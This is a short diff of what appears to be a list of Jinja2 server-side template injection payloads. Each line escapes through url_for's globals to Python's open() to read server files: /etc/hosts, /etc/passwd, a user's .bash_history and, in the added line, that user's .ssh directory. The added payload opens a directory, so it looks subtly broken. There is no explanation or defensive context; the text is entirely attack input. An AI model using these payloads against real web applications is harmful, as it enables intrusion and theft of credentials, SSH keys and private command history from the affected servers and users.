@@ -1,3 +1,3 @@
 {{url_for.__globals__['__builtins__']['open']('/etc/hosts').read()}}
 {{url_for.__globals__['__builtins__']['open']('/etc/passwd').read()}}
-{{url_for.__globals__['__builtins__']['open']('/home/uraj/.bash_history').read()}}
+{{url_for.__globals__['__builtins__']['open']('/home/uraj/.ssh/').read()}}
